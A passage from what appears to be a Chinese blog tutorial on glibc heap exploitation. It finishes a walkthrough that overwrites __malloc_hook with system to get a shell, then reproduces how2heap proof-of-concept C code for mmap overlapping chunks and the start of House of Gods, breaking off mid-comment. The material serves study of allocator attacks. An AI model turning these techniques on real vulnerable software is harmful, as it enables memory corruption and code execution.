<p>部署如上 <code>chunk</code>，从上到下分别为 <code>fastbin_victim</code> ，<code>obstruct</code>，<code>main_arena_use</code>，<code>relative_offset_heap</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013204454716.png"
                      alt="image-20231013204454716"
                ></p>
<p>将 <code>main_arena_use</code> 放进 <code>unsorted_bin</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013204656108.png"
                      alt="image-20231013204656108"
                ></p>
<p>再次申请 <code>0x70</code> 大小的 <code>chunk: fake_libc_chunk</code> ，拆分 <code>main_arena_use</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013205315619.png"
                      alt="image-20231013205315619"
                ></p>
<p>利用 <code>fake_libc_chunk</code> 中保存的 <code>libc</code> 地址和固定偏移 <code>glibc_2.23为0xe8（每个版本基本都不同）</code> 计算出 <code>__malloc_hook</code> 地址。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013205510025.png"
                      alt="image-20231013205510025"
                ></p>
<p>依次释放 <code>relative_offset_heap</code>，<code>fastbin_victim</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013210049926.png"
                      alt="image-20231013210049926"
                ></p>
<p>将 <code>fastbin_victim</code> 的 <code>fd</code> 指针的末尾两位改为 <code>0</code>，那么将会把 <code>fake_libc_chunk</code> 链接进 <code>fastbinY[5](0x70)</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013210254989.png"
                      alt="image-20231013210254989"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013210849688.png"
                      alt="image-20231013210849688"
                ></p>
<p><code>glibc_2.23</code> 版本在 <code>__malloc_hook-0x23</code> 处存在 <code>0x7f</code> 大小的 <code>fake_fast</code> ，我们将 <code>fake_libc_chunk</code> 的 <code>fd</code> 指针指向 <code>fake_fast_malloc_hook</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013211147427.png"
                      alt="image-20231013211147427"
                ></p>
<p>申请 <code>3</code> 次 <code>0x70</code> 大小的 <code>chunk</code>，可以将 <code>fake_fast_malloc_hook</code> 申请出来。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013211909572.png"
                      alt="image-20231013211909572"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013211951560.png"
                      alt="image-20231013211951560"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013212024266.png"
                      alt="image-20231013212024266"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013212227267.png"
                      alt="image-20231013212227267"
                ></p>
<p>因为 <code>__malloc_hook</code> 和 <code>system</code> 的地址差异较大，需要更改的字节较多，所以我们通过 <code>unsorted_bin attack(前文有介绍，不再赘述)</code> 将其改为 <code>main_arena + 0x58</code> 处的地址，再将其改为 <code>system</code> 地址即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013212506159.png"
                      alt="image-20231013212506159"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013212722616.png"
                      alt="image-20231013212722616"
                ></p>
<p>从 <code>19(0x13，也就是 0x23-0x8_fd-0x8_bk)</code> 处开始按字节写入后 <code>system</code> 几位地址 ，再去 <code>&quot;malloc(&quot;/bin/sh\x00&quot;)&quot;</code> 即可 <code>getshell</code> 。</p>
<h2 id="mmap-overlapping-chunks"><a href="#mmap-overlapping-chunks" class="headerlink" title="mmap_overlapping_chunks"></a>mmap_overlapping_chunks</h2><h3 id="源码-17"><a href="#源码-17" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Technique should work on all versions of GLibC</span></span><br><span class="line"><span class="comment">Compile: `gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g`</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC written by POC written by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	A primer on Mmap chunks in GLibC</span></span><br><span class="line"><span class="comment">	==================================</span></span><br><span class="line"><span class="comment">	In GLibC, there is a point where an allocation is so large that malloc</span></span><br><span class="line"><span class="comment">	decides that we need a seperate section of memory for it, instead </span></span><br><span class="line"><span class="comment">	of allocating it on the normal heap. This is determined by the mmap_threshold var.</span></span><br><span class="line"><span class="comment">	Instead of the normal logic for getting a chunk, the system call *Mmap* is </span></span><br><span class="line"><span class="comment">	used. This allocates a section of virtual memory and gives it back to the user. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Similarly, the freeing process is going to be different. Instead </span></span><br><span class="line"><span class="comment">	of a free chunk being given back to a bin or to the rest of the heap,</span></span><br><span class="line"><span class="comment">	another syscall is used: *Munmap*. This takes in a pointer of a previously </span></span><br><span class="line"><span class="comment">	allocated Mmap chunk and releases it back to the kernel. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Mmap chunks have special bit set on the size metadata: the second bit. If this </span></span><br><span class="line"><span class="comment">	bit is set, then the chunk was allocated as an Mmap chunk. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Mmap chunks have a prev_size and a size. The *size* represents the current </span></span><br><span class="line"><span class="comment">	size of the chunk. The *prev_size* of a chunk represents the left over space</span></span><br><span class="line"><span class="comment">	from the size of the Mmap chunk (not the chunks directly belows size). </span></span><br><span class="line"><span class="comment">	However, the fd and bk pointers are not used, as Mmap chunks do not go back </span></span><br><span class="line"><span class="comment">	into bins, as most heap chunks in GLibC Malloc do. Upon freeing, the size of </span></span><br><span class="line"><span class="comment">	the chunk must be page-aligned.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The POC below is essentially an overlapping chunk attack but on mmap chunks. </span></span><br><span class="line"><span class="comment">	This is very similar to https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c. </span></span><br><span class="line"><span class="comment">	The main difference is that mmapped chunks have special properties and are </span></span><br><span class="line"><span class="comment">	handled in different ways, creating different attack scenarios than normal </span></span><br><span class="line"><span class="comment">	overlapping chunk attacks. There are other things that can be done, </span></span><br><span class="line"><span class="comment">	such as munmapping system libraries, the heap itself and other things.</span></span><br><span class="line"><span class="comment">	This is meant to be a simple proof of concept to demonstrate the general </span></span><br><span class="line"><span class="comment">	way to perform an attack on an mmap chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	For more information on mmap chunks in GLibC, read this post: </span></span><br><span class="line"><span class="comment">	http://tukan.farm/2016/07/27/munmap-madness/</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>); </span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Extremely large chunks are special because they are allocated in their own mmaped section\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;of memory, instead of being put onto the normal heap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;=======================================================\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating three extremely large heap chunks of size 0x100000 \n\n&quot;</span>);</span><br><span class="line">		</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The first mmap chunk goes directly above LibC: %p\n&quot;</span>,top_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// After this, all chunks are allocated downwards in memory towards the heap.</span></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The second mmap chunk goes below LibC: %p\n&quot;</span>, mmap_chunk_2);</span><br><span class="line"></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The third mmap chunk goes below the second mmap chunk: %p\n&quot;</span>, mmap_chunk_3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nCurrent System Memory Layout \n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;================================================\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;running program\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;heap\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;....\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;third mmap chunk\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;second mmap chunk\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;LibC\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;....\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;ld\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;first mmap chunk\n&quot;</span></span><br><span class="line">			<span class="string">&quot;===============================================\n\n&quot;</span> \</span><br><span class="line">			);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Prev Size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Size of third mmap chunk: 0x%llx\n\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Change the size of the third mmap chunk to overlap with the second mmap chunk\n&quot;</span>);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This will cause both chunks to be Munmapped and given back to the system\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is where the vulnerability occurs; corrupting the size or prev_size of a chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.</span></span><br><span class="line">	<span class="comment">// Additionally, this same attack can be used with the prev_size instead of the size.</span></span><br><span class="line">	mmap_chunk_3[<span class="number">-1</span>] = (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="number">-1</span>]) + (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="number">-1</span>]) | <span class="number">2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Free the third mmap chunk, which munmaps the second and third chunks\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	This next call to free is actually just going to call munmap on the pointer we are passing it.</span></span><br><span class="line"><span class="comment">	The source code for this can be found at https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c#L2845</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	With normal frees the data is still writable and readable (which creates a use after free on </span></span><br><span class="line"><span class="comment">	the chunk). However, when a chunk is munmapped, the memory is given back to the kernel. If this</span></span><br><span class="line"><span class="comment">	data is read or written to, the program crashes.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Because of this added restriction, the main goal is to get the memory back from the system</span></span><br><span class="line"><span class="comment">	to have two pointers assigned to the same location.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="comment">// Munmaps both the second and third pointers</span></span><br><span class="line">	<span class="built_in">free</span>(mmap_chunk_3); </span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Would crash, if on the following:</span></span><br><span class="line"><span class="comment">	mmap_chunk_2[0] = 0xdeadbeef;</span></span><br><span class="line"><span class="comment">	This is because the memory would not be allocated to the current program.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Allocate a very large chunk with malloc. This needs to be larger than </span></span><br><span class="line"><span class="comment">	the previously freed chunk because the mmapthreshold has increased to 0x202000.</span></span><br><span class="line"><span class="comment">	If the allocation is not larger than the size of the largest freed mmap </span></span><br><span class="line"><span class="comment">	chunk then the allocation will happen in the normal section of heap memory.</span></span><br><span class="line"><span class="comment">	*/</span>	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Get a very large chunk from malloc to get mmapped chunk\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This should overlap over the previously munmapped/freed chunks\n&quot;</span>);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* overlapping_chunk = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr: %p\n&quot;</span>, overlapping_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr Size: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Gets the distance between the two pointers.</span></span><br><span class="line">	<span class="type">int</span> distance = mmap_chunk_2 - overlapping_chunk;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Distance between new chunk and the second mmap chunk (which was munmapped): 0x%x\n&quot;</span>, distance);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Value of index 0 of mmap chunk 2 prior to write: %llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Set the value of the overlapped chunk.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Setting the value of the overlapped chunk\n&quot;</span>);</span><br><span class="line">	overlapping_chunk[distance] = <span class="number">0x1122334455667788</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Show that the pointer has been written to.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Second chunk value (after write): 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk value: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Boom! The new chunk has been overlapped with a previous mmaped chunk\n&quot;</span>);</span><br><span class="line">	<span class="built_in">assert</span>(mmap_chunk_2[<span class="number">0</span>] == overlapping_chunk[distance]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-17"><a href="#调试-17" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014110953593.png"
                      alt="image-20231014110953593"
                ></p>
<p>首先申请三个 <code>0x100000</code> 大小的 <code>mmap_chunk</code>，分别为 <code>top_ptr</code>，<code>mmap_chunk_2</code>，<code>mmap_chunk_3</code>，第一个 <code>top_ptr</code> 位于 <code>libc.so</code> 上方。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111020031.png"
                      alt="image-20231014111020031"
                ></p>
<p>接下来将 <code>mmap_chunk_3</code> 的 <code>size</code> 改为 <code>202002</code>，因为 <code>mmap_chunk_3</code> 位于 <code>mmap_chunk_2</code> 低地址处，所以 <code>mmap_chunk_3</code> 现在的 <code>size</code> 大小包含了 <code>mmap_chunk_2</code> ，与 <code>2</code> 取与运算是为了将 <code>IS_MMAP</code> 位置为 <code>1</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111503915.png"
                      alt="image-20231014111503915"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111605033.png"
                      alt="image-20231014111605033"
                ></p>
<p>接下来 <code>free(mmap_chunk_3)</code> 。再次申请 <code>0x300000</code> 大小的 <code>overlapping_chunk</code>，<code>mmap_chunk_2</code> 被包含在了 <code>overlapping_chunk</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111828047.png"
                      alt="image-20231014111828047"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111851907.png"
                      alt="image-20231014111851907"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111909499.png"
                      alt="image-20231014111909499"
                ></p>
<p>我们可以通过 <code>overlapping_chunk</code> 去修改 <code>mmap_chunk_2</code> 的内容。</p>
<h2 id="house-of-gods"><a href="#house-of-gods" class="headerlink" title="house_of_gods"></a>house_of_gods</h2><p><code>glibc &lt; 2.27</code>，这是一个比较有趣的利用手法。</p>
<h3 id="源码-18"><a href="#源码-18" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* House of Gods PoC */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Welcome to the House of Gods...</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * House of Gods is an arena hijacking technique for glibc &lt; 2.27. It supplies</span></span><br><span class="line"><span class="comment"> * the attacker with an arbitrary write against the thread_arena symbol of</span></span><br><span class="line"><span class="comment"> * the main thread. This can be used to replace the main_arena with a</span></span><br><span class="line"><span class="comment"> * carefully crafted fake arena. The exploit was tested against</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     - glibc-2.23</span></span><br><span class="line"><span class="comment"> *     - glibc-2.24</span></span><br><span class="line"><span class="comment"> *     - glibc-2.25</span></span><br><span class="line"><span class="comment"> *     - glibc-2.26</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Following requirements are mandatory</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     - 8 allocs of arbitrary size to hijack the arena (+2 for ACE)</span></span><br><span class="line"><span class="comment"> *     - control over first 5 quadwords of a chunk&#x27;s userdata</span></span><br><span class="line"><span class="comment"> *     - a single write-after-free bug on an unsorted chunk</span></span><br><span class="line"><span class="comment"> *     - heap address leak + libc address leak</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This PoC demonstrates how to leverage the House of Gods in order to hijack</span></span><br><span class="line"><span class="comment"> * the thread_arena. But it wont explain how to escalate further to</span></span><br><span class="line"><span class="comment"> * arbitrary code execution, since this step is trivial once the whole arena</span></span><br><span class="line"><span class="comment"> * is under control.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Also note, that the how2heap PoC might use more allocations than</span></span><br><span class="line"><span class="comment"> * previously stated. This is intentional and has educational purposes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If you want to read the full technical description of this technique, going</span></span><br><span class="line"><span class="comment"> * from zero to arbitrary code execution within only 10 to 11 allocations, here</span></span><br><span class="line"><span class="comment"> * is the original document I&#x27;ve written</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     https://github.com/Milo-D/house-of-gods/blob/master/rev2/HOUSE_OF_GODS.TXT</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * I recommend reading this document while experimenting with</span></span><br><span class="line"><span class="comment"> * the how2heap PoC.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Besides that, this technique abuses a minor bug in glibc, which I have</span></span><br><span class="line"><span class="comment"> * already submitted to bugzilla at</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     https://sourceware.org/bugzilla/show_bug.cgi?id=29709</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * AUTHOR: David Milosevic (milo)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &lt;--- Exploit PoC ---&gt; */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=================\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;= House of Gods =\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=== Abstract ===\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The core of this technique is to allocate a fakechunk overlapping\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the binmap field within the main_arena. This fakechunk is located at\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;offset 0x850. Its sizefield can be crafted by carefully binning chunks\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;into smallbins or largebins. The binmap-chunk is then being linked into\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the unsorted bin via a write-after-free bug in order to allocate it back\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;as an exact fit. One can now tamper with the main_arena.next pointer at\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;offset 0x868 and inject the address of a fake arena. A final unsorted bin\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;attack corrupts the narenas variable with a very large value. From there, only\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;two more allocation requests for at least 0xffffffffffffffc0 bytes of memory\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;are needed to trigger two consecutive calls to the reused_arena() function,\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;which in turn traverses the corrupted arena-list and sets thread_arena to the\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;address stored in main_arena.next - the address of the fake arena.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=== PoC ===\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Okay, so let us start by allocating some chunks...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * allocate a smallchunk, for example a 0x90-chunk.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *SMALLCHUNK = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * allocate the first fastchunk. We will use</span></span><br><span class="line"><span class="comment">     * a 0x20-chunk for this purpose.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *FAST20 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * allocate a second fastchunk. This time</span></span><br><span class="line"><span class="comment">     * a 0x40-chunk.</span></span><br><span class="line"><span class="comment">   